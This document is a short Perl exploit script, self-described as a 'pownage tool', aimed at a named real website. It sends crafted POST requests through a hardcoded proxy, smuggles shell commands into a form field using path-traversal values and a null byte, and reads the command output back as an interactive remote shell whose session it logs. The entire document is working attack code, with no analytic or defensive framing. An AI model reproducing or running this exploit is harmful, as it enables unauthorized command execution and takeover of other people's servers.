#!/usr/bin/perl

# CONFIG

# victim host
$host = "www.csteam.ru";

# proxy IP
$proxy_host = "213.47.236.157";
# proxy PORT
$proxy_port = 6588;
# path to delete.cgi
$path = "dl.php";

use Socket;

print " -==[ Evil Mad CSTEAM.ru pownage tool\n";

$query = "user=..\\&pass=1\\&isLogin=3\\&SessionID=66\\&servname=..\\";
$query .= "&folder=..\\&msgnum=\x253B";

$header = "POST http://${host}${path} HTTP/1.1\r\n";
$header .= "Host: ${host}\r\n";
$header .= "Connection: close\r\n";
$header .= "Content-Type: application/x-www-form-urlencoded\r\n";

open(LOGF, ">>shell_logs/$host");

while (1)
{
  print "\x24 ";
  $cmd = <>;
  chomp $cmd;
  print LOGF "\x24 $cmd\n";

  if ($cmd eq "quit" || $cmd eq "exit")
  {
    close(LOGF);
    exit;
  }

  socket(CON, AF_INET, SOCK_STREAM, 0);

  if (!connect(CON, sockaddr_in($proxy_port, inet_aton($proxy_host))))
  {
    print "[-] proxy error\n";
    close(LOGF);
    exit;
  }

  send(CON, $header, 0);

  $cmd = "echo 89z661a231;".$cmd."; echo 7a65he5a13;";
  $cmd =~ s/\x2f/\x25\x32\x66/g; # code '/'
  $cmd =~ s/\x20/\x25\x32\x30/g; # code ' '
  $cmd =~ s/\x26/\x25\x32\x36/g; # code '&'
  $cmd =~ s/\x3c/\x25\x33\x63/g; # code '<'
  $cmd =~ s/\x3e/\x25\x33\x65/g; # code '>'
  $cmd =~ s/\x3b/\x25\x33\x62/g; # code ';'

  $str = "${query}$cmd\x2500";
  send(CON, "Content-Length: ".length($str)."\r\n\r\n",0);
  send(CON, $str, 0);

  do { @page = <CON>; } while(<CON>);
  close(CON);

  $t = 0;
  for ($i = 1; $i < $#page; $i++)
  {
    $line = $page[$i];
    chomp $line;

    if ($t == 1 && $line =~ m/7a65he5a13/){ $t = 0;}
    if ($t == 1){ print "$line\n"; print LOGF "$line\n"; }
    if ($t == 0 && $line =~ m/89z661a231/){ $t = 1;}
  }
}
